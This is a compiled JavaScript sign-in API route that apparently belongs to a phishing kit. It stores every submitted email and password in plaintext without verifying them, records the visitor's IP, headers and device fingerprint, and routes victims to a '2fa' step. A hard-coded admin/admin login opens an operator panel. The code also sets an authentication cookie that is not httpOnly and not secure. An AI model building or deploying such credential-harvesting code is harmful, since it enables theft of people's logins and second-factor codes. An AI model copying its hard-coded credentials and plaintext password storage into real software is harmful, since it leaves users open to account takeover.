import { i as initializeDb, g as getUserByEmail, c as createUser } from '../../../chunks/db__92qgssi.mjs';
import { serialize } from 'cookie';
import * as UAParser from 'ua-parser-js';
import requestIp from 'request-ip';
export { renderers } from '../../../renderers.mjs';

initializeDb();
function generateShortUID() {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let uid = "";
  for (let i = 0; i < 5; i++) {
    uid += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return uid;
}
function getBrowserInfo(userAgent) {
  const parser = new UAParser.UAParser(userAgent);
  const browser = parser.getBrowser();
  const os = parser.getOS();
  const device = parser.getDevice();
  return {
    browser: `${browser.name || "Unknown"} ${browser.version || ""}`.trim(),
    os: `${os.name || "Unknown"} ${os.version || ""}`.trim(),
    device: device.type || "desktop",
    userAgent
  };
}
function getAllHeadersAndIP(request) {
  const headers = {};
  request.headers.forEach((value, key) => {
    headers[key] = value;
  });
  const clientIp = requestIp.getClientIp(request) || "0.0.0.0";
  const connectionInfo = {
    ip: clientIp,
    headers,
    referer: headers["referer"] || "Direct",
    language: headers["accept-language"] || "Unknown",
    encoding: headers["accept-encoding"] || "Unknown",
    connection: headers["connection"] || "Unknown",
    host: headers["host"] || "Unknown",
    origin: headers["origin"] || "Unknown",
    sec_ch_ua: headers["sec-ch-ua"] || "Unknown",
    sec_ch_ua_mobile: headers["sec-ch-ua-mobile"] || "Unknown",
    sec_ch_ua_platform: headers["sec-ch-ua-platform"] || "Unknown",
    sec_fetch_dest: headers["sec-fetch-dest"] || "Unknown",
    sec_fetch_mode: headers["sec-fetch-mode"] || "Unknown",
    sec_fetch_site: headers["sec-fetch-site"] || "Unknown",
    sec_fetch_user: headers["sec-fetch-user"] || "Unknown",
    upgrade_insecure_requests: headers["upgrade-insecure-requests"] || "Unknown"
  };
  return connectionInfo;
}
const POST = async ({ request }) => {
  try {
    const data = await request.json();
    const { email, password } = data;
    const connectionInfo = getAllHeadersAndIP(request);
    const userAgent = request.headers.get("user-agent") || "Unknown";
    const { browser, os, device, userAgent: fullUserAgent } = getBrowserInfo(userAgent);
    let user = await getUserByEmail(email);
    if (!user) {
      const result = await createUser({
        email,
        password,
        uid: generateShortUID(),
        ip_address: connectionInfo.ip,
        browser,
        operating_system: os,
        user_agent: fullUserAgent,
        current_page: "2fa",
        status: "active",
        connection_info: JSON.stringify(connectionInfo)
        // Store all connection info
      });
      if (!result) {
        throw new Error("Failed to create user");
      }
      user = await getUserByEmail(email);
      if (!user) {
        throw new Error("Failed to create or retrieve user");
      }
    }
    const isAdmin = email === "admin@gmail.com";
    if (isAdmin && password !== "admin") {
      throw new Error("Invalid admin credentials");
    }
    const cookie = serialize("user_email", user.email, {
      path: "/",
      httpOnly: false,
      sameSite: "lax",
      maxAge: 60 * 60 * 24 * 7,
      // 1 week
      secure: false
      // Changed to false for development
    });
    return new Response(JSON.stringify({
      success: true,
      user: {
        email: user.email,
        current_page: isAdmin ? "panel" : user.current_page,
        status: user.status,
        isAdmin
      }
    }), {
      status: 200,
      headers: {
        "Set-Cookie": cookie,
        "Content-Type": "application/json"
      }
    });
  } catch (error) {
    console.error("Error in signin:", error);
    return new Response(JSON.stringify({
      error: error instanceof Error ? error.message : "An error occurred during signin"
    }), {
      status: 500,
      headers: {
        "Content-Type": "application/json"
      }
    });
  }
};

const _page = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  POST
}, Symbol.toStringTag, { value: 'Module' }));

const page = () => _page;

export { page };
